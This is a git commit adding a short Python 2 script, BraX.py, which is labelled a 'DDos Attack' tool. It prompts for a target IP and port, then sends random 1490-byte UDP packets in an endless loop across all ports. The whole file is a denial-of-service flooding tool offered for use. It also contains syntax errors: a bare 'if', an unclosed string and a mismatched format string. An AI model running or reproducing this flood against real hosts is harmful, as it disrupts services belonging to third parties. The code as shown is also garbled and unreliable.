4ff6933f4cac84b1c5c40384d1b0b4af5075d62b
Brax3x1 <43708356+Brax3x1@users.noreply.github.com>
2018-09-30 03:04:45 +0700

    Add files via upload

---
+++ BraX.py
@@ -0,0 +1,41 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Author   : PANDAx"
+print "Facebook : https://m.facebook.com/J.cknew
+print
+
+if
+ip = raw_input("IP : ")
+port = input("Port : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "succeed %s"%(sent,ip,port)
+     if port == 65535:
+       port = 1
+
